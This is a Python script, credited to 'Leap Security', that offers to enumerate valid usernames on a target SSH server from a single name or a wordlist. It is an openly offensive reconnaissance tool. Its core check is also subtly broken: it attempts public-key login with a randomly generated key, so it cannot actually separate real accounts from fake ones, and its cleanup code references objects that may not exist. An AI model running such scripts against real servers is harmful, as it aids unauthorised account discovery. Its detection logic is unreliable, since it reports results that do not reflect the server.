
#!/usr/bin/env python3

import argparse
import logging
import paramiko
import socket
import sys
import os

class InvalidUsername(Exception):
    pass

# Print valid users found out so far
def print_result(valid_users):
    if valid_users:
        print("Valid Users: ")
        for user in valid_users:
            print(user)
    else:
        print("No valid user detected.")

# Perform authentication with a public key and username
def check_user(username, target, port):
    try:
        # Create a socket connection
        sock = socket.socket()
        sock.connect((target, port))
        
        # Set up the SSH transport
        transport = paramiko.Transport(sock)
        transport.start_client(timeout=10)
        
        # Use a dummy public key for authentication
        key = paramiko.RSAKey.generate(2048)
        try:
            transport.auth_publickey(username, key)
            # If authentication succeeds, we consider the user valid
            if transport.is_active():
                print(f"[+] {username} is a valid username")
                return True
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[-] {username} is an invalid username")
            return False
    except paramiko.ssh_exception.SSHException as e:
        print(f'[!] Failed to negotiate SSH transport: {e}')
        sys.exit(2)
    except Exception as e:
        print(f"[-] Error occurred: {e}")
    finally:
        transport.close()
        sock.close()
    return False

def check_userlist(wordlist_path, target, port):
    if os.path.isfile(wordlist_path):
        valid_users = []
        with open(wordlist_path) as f:
            for line in f:
                username = line.strip()
                try:
                    if check_user(username, target, port):
                        valid_users.append(username)
                except KeyboardInterrupt:
                    print("Enumeration aborted by user!")
                    break

        print_result(valid_users)
    else:
        print(f"[-] {wordlist_path} is an invalid wordlist file")
        sys.exit(2)

# Remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

def main():
    parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
    parser.add_argument('target', help="IP address of the target system")
    parser.add_argument('-p', '--port', default=22, type=int, help="Set port of SSH service")
    parser.add_argument('-u', '--user', dest='username', help="Username to check for validity.")
    parser.add_argument('-w', '--wordlist', dest='wordlist', help="Username wordlist")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    if args.wordlist:
        check_userlist(args.wordlist, args.target, args.port)
    elif args.username:
        check_user(args.username, args.target, args.port)
    else:
        print("[-] Username or wordlist must be specified!\n")
        parser.print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()
